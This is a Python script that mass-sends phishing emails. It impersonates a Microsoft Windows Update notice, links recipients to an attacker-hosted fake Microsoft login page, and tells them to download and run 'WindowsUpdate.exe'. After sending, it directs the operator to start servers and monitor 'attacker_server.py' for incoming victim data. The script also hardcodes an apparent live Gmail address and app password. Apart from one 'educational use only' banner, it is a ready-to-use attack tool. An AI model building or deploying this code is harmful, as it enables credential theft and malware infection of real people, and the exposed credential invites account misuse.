"""
Automatic Phishing Email Sender
Reads emails from CSV and sends automatically using SMTP
Based on auto_sending_email.py pattern
"""

import smtplib
import csv
import socket
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import sys

# ==================== CONFIGURATION ====================
# Configure your sender email here (no need to type every time)
SENDER_EMAIL = "scanplexz@gmail.com"
SENDER_PASSWORD = "hpgr jzpx nkqh ifyy"  # Gmail App Password (16 characters)
USE_GMAIL = True  # True for Gmail, False for Outlook
# ======================================================

def get_local_ip():
    """Get the local IP address of the attacker machine"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "192.168.5.128"

def load_email_dataset(csv_file="email_dataset.csv"):
    """Load victim emails from CSV file"""
    import os
    
    # Get full path
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, csv_file)
    
    victims = []
    try:
        with open(csv_path, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if 'email' in row and row['email']:
                    victims.append({
                        'email': row['email'].strip(),
                        'name': row.get('name', 'User').strip()
                    })
        return victims
    except FileNotFoundError:
        print(f"❌ Error: {csv_path} not found!")
        print("Creating example CSV file...")
        with open(csv_path, 'w', encoding='utf-8') as f:
            f.write("email,name\n")
            f.write("sunhak890@gmail.com,Test User\n")
        print(f"✅ Created {csv_path} - Edit it and run again!")
        sys.exit(1)

def create_phishing_email(victim_name, attacker_ip):
    """Create phishing email content"""
    subject = "Windows Update Available"
    
    # Professional HTML design that looks like real Microsoft email
    html_body = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
</head>
<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5;">
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color: #f5f5f5;">
        <tr>
            <td align="center" style="padding: 40px 0;">
                <!-- Main Email Container -->
                <table width="600" cellpadding="0" cellspacing="0" border="0" style="background-color: #ffffff; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                    
                    <!-- Header with Microsoft Logo -->
                    <tr>
                        <td style="background-color: #0078d4; padding: 20px; text-align: center;">
                            <h1 style="color: #ffffff; margin: 0; font-size: 24px; font-weight: 300;">
                                Microsoft Update Center
                            </h1>
                        </td>
                    </tr>
                    
                    <!-- Content -->
                    <tr>
                        <td style="padding: 40px 30px;">
                            <p style="color: #333333; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
                                Hello {victim_name},
                            </p>
                            
                            <p style="color: #333333; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
                                A new Windows update is available for your computer. This update includes important security improvements and performance enhancements.
                            </p>
                            
                            <!-- Update Info Box -->
                            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color: #f0f8ff; border-left: 4px solid #0078d4; margin: 20px 0;">
                                <tr>
                                    <td style="padding: 20px;">
                                        <p style="margin: 0 0 10px 0; color: #0078d4; font-weight: 600; font-size: 14px;">
                                            UPDATE AVAILABLE
                                        </p>
                                        <p style="margin: 0; color: #333333; font-size: 14px; line-height: 1.5;">
                                            Windows Security Update - Version 2025.12<br>
                                            Size: 125 MB<br>
                                            Release Date: December 2025
                                        </p>
                                    </td>
                                </tr>
                            </table>
                            
                            <!-- Download Button -->
                            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin: 30px 0;">
                                <tr>
                                    <td align="center">
                                        <a href="http://{attacker_ip}:8000/windows-update.html" 
                                           style="display: inline-block; padding: 15px 40px; background-color: #0078d4; color: #ffffff; text-decoration: none; border-radius: 2px; font-size: 16px; font-weight: 500;">
                                            Download Update
                                        </a>
                                    </td>
                                </tr>
                            </table>
                            
                            <p style="color: #666666; font-size: 14px; line-height: 1.6; margin: 20px 0 0 0;">
                                Or verify your Microsoft account to continue: 
                                <a href="http://{attacker_ip}:8000/fake-microsoft-login.html" style="color: #0078d4; text-decoration: none;">Sign in here</a>
                            </p>
                            
                            <!-- Installation Steps -->
                            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin: 30px 0 0 0; border-top: 1px solid #e0e0e0; padding-top: 20px;">
                                <tr>
                                    <td>
                                        <p style="color: #333333; font-size: 14px; font-weight: 600; margin: 0 0 15px 0;">
                                            Installation Steps:
                                        </p>
                                        <ol style="color: #666666; font-size: 14px; line-height: 1.8; margin: 0; padding-left: 20px;">
                                            <li>Click the download button above</li>
                                            <li>Run the downloaded file (WindowsUpdate.exe)</li>
                                            <li>Follow the on-screen instructions</li>
                                            <li>Restart your computer when prompted</li>
                                        </ol>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    
                    <!-- Footer -->
                    <tr>
                        <td style="background-color: #f5f5f5; padding: 20px 30px; border-top: 1px solid #e0e0e0;">
                            <p style="color: #666666; font-size: 12px; line-height: 1.6; margin: 0 0 10px 0;">
                                <strong>Microsoft Corporation</strong><br>
                                One Microsoft Way<br>
                                Redmond, WA 98052-6399
                            </p>
                            <p style="color: #999999; font-size: 11px; line-height: 1.5; margin: 10px 0 0 0;">
                                This is an automated message from Microsoft Update Services. Please do not reply to this email.
                            </p>
                        </td>
                    </tr>
                    
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
    """
    
    return subject, html_body

def send_phishing_emails(sender_email, sender_password, victims, attacker_ip):
    """Send phishing emails to all victims using SMTP"""
    
    print(f"\n📧 Preparing to send {len(victims)} phishing emails...")
    print(f"📤 Sender: {sender_email}")
    print(f"🌐 Attacker IP: {attacker_ip}")
    print("="*70)
    
    success_count = 0
    fail_count = 0
    
    # Determine SMTP server based on configuration
    smtp_server = 'smtp.gmail.com' if USE_GMAIL else 'smtp-mail.outlook.com'
    
    try:
        # Connect to SMTP server
        print(f"\n🔗 Connecting to {smtp_server}...")
        server = smtplib.SMTP(smtp_server, 587)
        server.starttls()
        
        print("🔐 Logging in...")
        server.login(sender_email, sender_password)
        print("✅ Login successful!\n")
        
        # Send email to each victim
        for i, victim in enumerate(victims, 1):
            try:
                victim_email = victim['email']
                victim_name = victim['name']
                
                print(f"[{i}/{len(victims)}] Sending to {victim_email}...", end=" ")
                
                # Create email
                subject, html_body = create_phishing_email(victim_name, attacker_ip)
                
                msg = MIMEMultipart('alternative')
                msg['From'] = sender_email
                msg['To'] = victim_email
                msg['Subject'] = subject
                
                # HTML email for professional look
                html_part = MIMEText(html_body, 'html')
                msg.attach(html_part)
                
                # Send
                server.send_message(msg)
                print("✅ Sent!")
                success_count += 1
                
            except Exception as e:
                print(f"❌ Failed: {str(e)}")
                fail_count += 1
        
        server.quit()
        print("\n" + "="*70)
        print(f"✅ Complete! Sent: {success_count}, Failed: {fail_count}")
        
    except smtplib.SMTPAuthenticationError:
        print("\n❌ ERROR: Authentication failed!")
        if smtp_server == 'smtp.gmail.com':
            print("Gmail troubleshooting:")
            print("1. Email and password are correct")
            print("2. Using Gmail App Password (not regular password)")
            print("3. 2-Step Verification is enabled")
            print("\nGet App Password: https://myaccount.google.com/apppasswords")
        else:
            print("Outlook troubleshooting:")
            print("1. Email and password are correct")
            print("2. Check account at: https://outlook.live.com")
            print("3. Try enabling SMTP in Outlook settings")
            print("\nFor new Outlook accounts, wait 24 hours or try:")
            print("- Login to Outlook web first")
            print("- Send a test email manually")
        
    except Exception as e:
        print(f"\n❌ ERROR: {str(e)}")

def main():
    print("="*70)
    print("AUTOMATIC PHISHING EMAIL SENDER")
    print("="*70)
    print("⚠️  EDUCATIONAL USE ONLY - Test with permission!")
    print("="*70)
    
    # Load victim emails from CSV
    print("\n📂 Loading email dataset...")
    victims = load_email_dataset("email_dataset.csv")
    print(f"✅ Loaded {len(victims)} victim(s):")
    for v in victims:
        print(f"   • {v['email']} ({v['name']})")
    
    # Get attacker IP
    attacker_ip = get_local_ip()
    print(f"\n🔍 Detected your IP: {attacker_ip}")
    user_ip = input(f"Press Enter to use this IP, or type different IP: ").strip()
    if user_ip:
        attacker_ip = user_ip
    
    # Use configured credentials
    sender_email = SENDER_EMAIL
    sender_password = SENDER_PASSWORD
    
    # Check if credentials are configured
    if "your-app-password-here" in sender_password or sender_password == "":
        print("\n" + "="*70)
        print("⚠️  WARNING: Sender credentials not configured!")
        print("="*70)
        print("Please edit auto_send_phishing.py (lines 16-18) and set:")
        print("  SENDER_EMAIL = 'zenplexz@gmail.com'")
        print("  SENDER_PASSWORD = 'your-16-char-app-password'")
        print("  USE_GMAIL = True")
        print("="*70)
        sys.exit(1)
    
    print("\n" + "="*70)
    print("SMTP CONFIGURATION")
    print("="*70)
    print(f"📧 Sender: {sender_email}")
    print(f"🔐 Password: {'*' * len(sender_password)}")
    print(f"📡 Service: {'Gmail' if USE_GMAIL else 'Outlook'}")
    print("="*70)
    
    # Confirm before sending
    print("\n" + "="*70)
    print("⚠️  READY TO SEND")
    print("="*70)
    print(f"From: {sender_email}")
    print(f"To: {len(victims)} recipient(s)")
    print(f"Links point to: {attacker_ip}:8000")
    print("="*70)
    
    confirm = input("\nType 'YES' to send emails: ").strip().upper()
    if confirm != "YES":
        print("❌ Cancelled!")
        sys.exit(0)
    
    # Send emails
    send_phishing_emails(sender_email, sender_password, victims, attacker_ip)
    
    print("\n" + "="*70)
    print("🎯 NEXT STEPS:")
    print("="*70)
    print("1. Start your servers:")
    print("   Terminal 1: py -m http.server 8000")
    print("   Terminal 2: py attacker_server.py")
    print()
    print("2. Wait for victims to:")
    print("   • Open email")
    print("   • Click link")
    print("   • Download WindowsUpdate.exe")
    print("   • Run the file")
    print()
    print("3. Monitor attacker_server.py for incoming data!")
    print("="*70)

if __name__ == "__main__":
    main()
